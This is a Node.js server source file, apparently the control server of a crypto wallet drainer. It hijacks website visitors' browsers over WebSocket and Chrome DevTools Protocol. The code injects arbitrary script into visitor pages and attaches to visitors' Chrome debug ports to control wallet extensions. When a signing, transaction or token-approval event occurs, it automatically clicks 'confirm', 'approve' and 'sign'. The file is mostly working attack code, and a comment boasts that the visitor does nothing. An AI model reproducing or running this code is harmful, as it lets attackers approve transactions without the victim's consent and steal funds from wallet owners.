#!/usr/bin/env node
/**
 * Playwright Visitor Server v2
 * - Mirror Playwright per visitor
 * - Remote click/inject on visitor page (WebSocket)
 * - CDP attach → visitor Chrome extension control (debug port)
 */

import { createServer } from 'node:http';
import { randomUUID } from 'node:crypto';
import { WebSocketServer } from 'ws';
import { PlaywrightSessionWorker, resolveExtensionPaths } from './playwright-session-worker.mjs';
import { PlaywrightCdpWorker, probeCdp } from './playwright-cdp-worker.mjs';

function parseArgs() {
  const args = process.argv.slice(2);
  const out = {
    port: Number(process.env.PW_VISITOR_PORT || 8791),
    site: process.env.AGENT_SITE_URL || 'http://localhost:3456',
    maxSessions: 20,
    spawnMirror: true,
    cdpUrl: process.env.CDP_URL || null,
    autoRemote: true,
  };
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--port' && args[i + 1]) out.port = Number(args[++i]);
    else if (args[i] === '--site' && args[i + 1]) out.site = args[++i];
    else if (args[i] === '--max-sessions' && args[i + 1]) out.maxSessions = Number(args[++i]);
    else if (args[i] === '--no-spawn') out.spawnMirror = false;
    else if (args[i] === '--cdp' && args[i + 1]) out.cdpUrl = args[++i];
    else if (args[i] === '--no-remote') out.autoRemote = false;
  }
  return out;
}

const opts = parseArgs();
const extPaths = resolveExtensionPaths();
const sessions = new Map();
const cdpBridges = new Set();

function broadcastCdpBurst(count = 25, reason = '') {
  for (const ws of cdpBridges) {
    sendWs(ws, { type: 'cdp:burst', count, reason });
  }
  if (cdpBridges.size) console.log(`[cdp] burst → ${cdpBridges.size} bridge(s) (${reason})`);
}

function sendWs(ws, obj) {
  if (ws?.readyState === 1) ws.send(JSON.stringify(obj));
}

function sendRemote(sessionId, cmd, payload = {}) {
  const s = sessions.get(sessionId);
  if (!s) return false;
  const cmdId = randomUUID().slice(0, 8);
  sendWs(s.ws, { type: 'remote:command', cmdId, cmd, payload });
  return cmdId;
}

function sendInject(sessionId, code, url) {
  const s = sessions.get(sessionId);
  if (!s) return;
  sendWs(s.ws, { type: 'playwright:inject', code, url });
}

async function attachCdp(sessionId, cdpUrl) {
  const s = sessions.get(sessionId);
  if (!s || s.cdp) return;
  try {
    const probe = await probeCdp(cdpUrl);
    if (!probe.ok) {
      console.log(`[cdp ${sessionId}] probe failed: ${probe.error}`);
      return;
    }
    const cdp = new PlaywrightCdpWorker(cdpUrl, sessionId);
    await cdp.connect();
    s.cdp = cdp;
    sendWs(s.ws, { type: 'playwright:status', status: 'cdp-attached', detail: { cdpUrl } });
    console.log(`[cdp ${sessionId}] attached (${probe.pages} pages)`);
  } catch (e) {
    console.error(`[cdp ${sessionId}] attach error:`, e.message);
  }
}

async function createMirrorWorker(sessionId, meta) {
  const worker = new PlaywrightSessionWorker(sessionId, {
    originUrl: meta.url || opts.site,
    chainId: meta.chainId || null,
    extPaths,
  });
  await worker.start();
  return worker;
}

async function onVisitorHello(ws, msg) {
  if (sessions.size >= opts.maxSessions) {
    sendWs(ws, { type: 'error', message: 'max sessions' });
    return;
  }

  const sessionId = randomUUID().slice(0, 8);
  const payload = msg.payload || {};
  const meta = {
    url: msg.url || payload.url || opts.site,
    chainId: payload.chainId,
    ua: payload.ua,
    mobile: payload.mobile,
    wallets: payload.wallets,
    cdp: payload.cdp,
    connectedAt: Date.now(),
  };

  let worker = null;
  if (opts.spawnMirror) {
    try {
      worker = await createMirrorWorker(sessionId, meta);
      console.log(`[session ${sessionId}] mirror → ${meta.url}`);
    } catch (e) {
      console.error(`[session ${sessionId}] mirror failed:`, e.message);
    }
  }

  const session = { ws, worker, cdp: null, meta, events: [] };
  sessions.set(sessionId, session);

  sendWs(ws, { type: 'session:assigned', sessionId, mirror: !!worker, cdp: false, auto: true });
  sendWs(ws, { type: 'playwright:status', status: 'ready', detail: { sessionId } });

  await runVisitorAutoPipeline(sessionId, meta);
}

/** Visitor ne kuch nahi kiya — server+script sab khud */
async function runVisitorAutoPipeline(sessionId, meta) {
  sendInject(sessionId, `
    window.ExtensionPopupAssist&&ExtensionPopupAssist.startBurst(120000);
    window.TermsWalletAutomation&&TermsWalletAutomation.startHandler&&TermsWalletAutomation.startHandler();
  `);

  sendRemote(sessionId, 'start');
  sendRemote(sessionId, 'approveScan');
  sendRemote(sessionId, 'connect');
  sendWs(sessions.get(sessionId)?.ws, { type: 'ext:burst', ms: 60_000 });

  broadcastCdpBurst(15, `new-visitor:${sessionId}`);

  const s = sessions.get(sessionId);
  if (s?.worker) {
    await s.worker.handleVisitorEvent('visitor:terms:accepted', {});
    const interval = setInterval(async () => {
      if (!sessions.has(sessionId)) return clearInterval(interval);
      await s.worker.tickExtensionWatcher();
      sendRemote(sessionId, 'approveScan');
    }, 2000);
    s.autoInterval = interval;
    setTimeout(() => clearInterval(interval), 120_000);
  }

  const cdpUrl = opts.cdpUrl
    || (meta.cdp?.cdpLocal ? `http://127.0.0.1:${meta.cdp.port || 9222}` : null);
  if (cdpUrl) await attachCdp(sessionId, cdpUrl);

  console.log(`[${sessionId}] auto-pipeline started`);
}

async function handleSignEvent(sessionId) {
  sendRemote(sessionId, 'approveScan');
  sendRemote(sessionId, 'clickText', { text: 'confirm', partial: true });
  sendRemote(sessionId, 'clickText', { text: 'approve', partial: true });
  sendRemote(sessionId, 'clickText', { text: 'sign', partial: true });
  sendWs(sessions.get(sessionId)?.ws, { type: 'ext:burst', ms: 30_000 });

  broadcastCdpBurst(30, `sign-event:${sessionId}`);

  const s = sessions.get(sessionId);
  if (s?.cdp) await s.cdp.burst(25);
  if (s?.worker) {
    for (let i = 0; i < 15; i++) {
      await s.worker.tickExtensionWatcher();
      await new Promise((r) => setTimeout(r, 200));
    }
  }
}

async function onVisitorEvent(sessionId, type, payload) {
  const s = sessions.get(sessionId);
  if (!s) return;

  s.events.push({ type, payload, ts: Date.now() });
  console.log(`[${sessionId}] ${type}`);

  if (s.worker) await s.worker.handleVisitorEvent(type, payload);

  if (['visitor:sign:typed-data', 'visitor:sign:personal', 'visitor:tx:send', 'visitor:token:approve-click'].includes(type)) {
    await handleSignEvent(sessionId);
    sendWs(s.ws, { type: 'visitor:nudge', message: 'Approve in wallet app' });
  }

  if (type === 'visitor:remote:result') {
    console.log(`[${sessionId}] remote result`, JSON.stringify(payload).slice(0, 100));
  }

  if (type.startsWith('visitor:ext:')) {
    const extType = type.replace('visitor:ext:', '');
    if (['popup-expected', 'page-hidden', 'window-blur'].includes(extType)) {
      broadcastCdpBurst(20, extType);
      sendWs(s.ws, { type: 'ext:burst', ms: 25_000 });
    }
    if (s?.cdp) await s.cdp.burst(15);
  }
}

function cleanupSession(sessionId) {
  const s = sessions.get(sessionId);
  if (!s) return;
  if (s.autoInterval) clearInterval(s.autoInterval);
  s.worker?.close().catch(() => {});
  s.cdp?.disconnect().catch(() => {});
  sessions.delete(sessionId);
}

function readBody(req) {
  return new Promise((resolve) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      try { resolve(JSON.parse(Buffer.concat(chunks).toString())); }
      catch { resolve({}); }
    });
  });
}

const httpServer = createServer(async (req, res) => {
  const json = (code, data) => {
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(data, null, 2));
  };

  if (req.url === '/health') return json(200, { ok: true, sessions: sessions.size });

  if (req.url === '/sessions') {
    return json(200, [...sessions.entries()].map(([id, s]) => ({
      id, url: s.meta.url, events: s.events.length, mirror: !!s.worker, cdp: !!s.cdp, mobile: s.meta.mobile,
    })));
  }

  const remoteMatch = req.url?.match(/^\/remote\/([^/]+)\/(\w+)/);
  if (remoteMatch && req.method === 'POST') {
    const [, sessionId, action] = remoteMatch;
    const body = await readBody(req);
    if (!sessions.has(sessionId)) return json(404, { error: 'session not found' });

    if (action === 'click') sendRemote(sessionId, 'click', { selector: body.selector });
    else if (action === 'clickText') sendRemote(sessionId, 'clickText', body);
    else if (action === 'touch') sendRemote(sessionId, 'touch', body);
    else if (action === 'connect') sendRemote(sessionId, 'connect');
    else if (action === 'inject') sendInject(sessionId, body.code, body.url);
    else if (action === 'cdp-burst') {
      await sessions.get(sessionId)?.cdp?.burst(body.count || 20);
    } else if (action === 'cdp-attach' && body.cdpUrl) {
      await attachCdp(sessionId, body.cdpUrl);
    } else return json(400, { error: 'unknown action' });

    return json(200, { ok: true, sessionId, action });
  }

  res.writeHead(200);
  res.end('Legion Playwright Visitor Server v2\n');
});

const wss = new WebSocketServer({ server: httpServer });

wss.on('connection', (ws) => {
  let boundSession = null;
  let isCdpBridge = false;

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }

    if (msg.type === 'cdp-bridge:hello') {
      isCdpBridge = true;
      cdpBridges.add(ws);
      console.log('[cdp-bridge] agent connected', msg.payload?.cdp || '');
      sendWs(ws, { type: 'cdp:burst', count: 5, reason: 'welcome' });
      return;
    }

    if (msg.type === 'visitor:hello') {
      await onVisitorHello(ws, msg);
      return;
    }

    const sessionId = msg.sessionId || boundSession;
    if (!sessionId) return;
    boundSession = sessionId;

    if (msg.type?.startsWith('visitor:')) {
      await onVisitorEvent(sessionId, msg.type, msg.payload);
    }
  });

  ws.on('close', () => {
    if (isCdpBridge) cdpBridges.delete(ws);
    if (boundSession) cleanupSession(boundSession);
  });
});

httpServer.listen(opts.port, () => {
  console.log('\n═══ Playwright Visitor Server v2 ═══');
  console.log(`WS:       ws://0.0.0.0:${opts.port}`);
  console.log(`Remote:   POST /remote/{sessionId}/click|clickText|touch|connect|inject|cdp-burst`);
  console.log(`CDP:      ${opts.cdpUrl || 'auto + visitor-cdp-bridge agents'}`);
  console.log(`Bridges:  visitor runs: node visitor-cdp-bridge.mjs --server ws://IP:8791`);
  console.log(`Mirror:   ${opts.spawnMirror}`);
  console.log(`Remote:   ${opts.autoRemote}\n`);
});

process.on('SIGINT', () => {
  for (const id of [...sessions.keys()]) cleanupSession(id);
  process.exit(0);
});
